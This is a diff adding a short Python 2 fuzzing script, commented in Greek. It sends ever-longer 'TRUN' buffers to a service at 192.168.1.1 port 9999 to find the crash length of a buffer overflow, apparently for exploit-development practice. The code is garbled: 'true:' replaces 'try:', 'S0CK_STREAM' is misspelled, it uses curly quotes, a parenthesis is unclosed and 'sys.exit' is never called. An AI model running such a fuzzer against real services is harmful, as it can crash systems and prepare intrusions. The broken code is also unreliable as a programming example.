@@ -1,0 +1,17 @@
+#! /usr/bin/python
+	import sys, socket
+	from time import sleep
+	
+	buffer = “A” * 100
+	
+	while True:
+			true:																								
+					s=socket.socket(socket.AF_INET,socket.S0CK_STREAM)					#μας επιτρέπει να  συνδεθούμε στο socket
+					s.connect(('192.168.1.1',9999))								#για ipv4 και το port
+					s.send(('TRUN /.:/' + buffer))
+					s.close()										#κλείνουμε την σύνδεση
+					sleep(1)										#sleep για 1 sec
+					buffer = buffer + “A”*100
+			except:
+					print “Fuzzing crashed at %s bytes” % (str(len(buffer))					#όταν σταματήσει να δουλεύει η παραπάνω σύνδεση θα μας εσπιστρέψει που ήταν ο buffer όταν κράσαρε
+					sys.exit
